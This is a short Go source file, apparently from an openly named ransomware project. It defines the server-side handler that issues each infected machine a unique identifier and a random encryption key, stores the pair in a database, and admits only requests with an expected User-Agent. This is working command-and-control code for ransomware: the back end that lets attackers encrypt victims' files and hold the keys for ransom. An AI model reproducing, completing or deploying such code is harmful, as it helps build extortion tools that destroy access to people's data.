package main

import (
	"fmt"
	"net/http"

	"github.com/julienschmidt/httprouter"
	"github.com/mauri870/ransomware/repository"
	"github.com/mauri870/ransomware/utils"
)

func generateKeyPair(w http.ResponseWriter, r *http.Request, _ httprouter.Params) {
	w.Header().Set("Content-Type", "application/json")

	if r.Header.Get("User-Agent") != ALLOWED_USER_AGENT {
		w.WriteHeader(http.StatusForbidden)
		fmt.Fprintf(w, ApiResponseForbidden)
		return
	}

	db := repository.Open("./database.db")
	defer db.Close()

	var identifier, encryptionKey string
	for {
		identifier, _ = utils.GenerateRandomANString(32)
		if db.IsAvailable(identifier) {
			encryptionKey, _ = utils.GenerateRandomANString(32)
			db.CreateOrUpdate(identifier, encryptionKey)
			break
		}
	}

	fmt.Fprintf(w, ApiResponseIdEncKey, identifier, encryptionKey)
}
